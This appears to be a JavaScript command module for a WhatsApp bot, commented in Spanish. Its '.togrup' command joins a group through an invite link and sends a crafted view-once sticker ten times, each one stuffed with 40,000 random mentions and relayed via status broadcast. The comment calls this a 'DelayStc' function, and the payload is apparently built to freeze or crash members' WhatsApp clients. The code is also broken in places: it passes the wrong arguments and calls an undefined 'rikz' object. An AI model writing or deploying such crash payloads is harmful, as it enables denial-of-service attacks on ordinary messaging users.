let handler = async (m, { conn, args }) => {
  const link = args[0];

  if (!link || !link.includes('chat.whatsapp.com/')) {
    return m.reply('📎 *Debes proporcionar un enlace de grupo válido.*\n\nEjemplo: .togrup https://chat.whatsapp.com/xxxxxxxxxxxx');
  }

  const code = link.split('/').pop().trim();
  let groupJid;

  try {
    groupJid = await conn.groupAcceptInvite(code);
    await delay(1500);
    await m.reply(`✅ *Bot unido al grupo correctamente.*`);
  } catch (e) {
    try {
      const info = await conn.groupGetInviteInfo(code);
      groupJid = info.id;
    } catch (err) {
      return m.reply('❌ *No se pudo acceder al grupo.*');
    }
  }

  // 🌀 Ejecuta las funciones 10 veces
  for (let i = 0; i < 10; i++) {
    try {
      await bulldozer(conn, groupJid);
      await delay(300);
    } catch (err) {
      console.log(`[ERROR EN ENVÍO ${i + 1}]`, err);
    }
  }

  await m.reply('✅ *Comando ejecutado con éxito.*');
};

handler.command = ['togrup'];
handler.owner = false;
handler.bot = false;

export default handler;

// 🧱 Función DelayStc adaptada
async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await rikz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

// 🕒 Delay
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}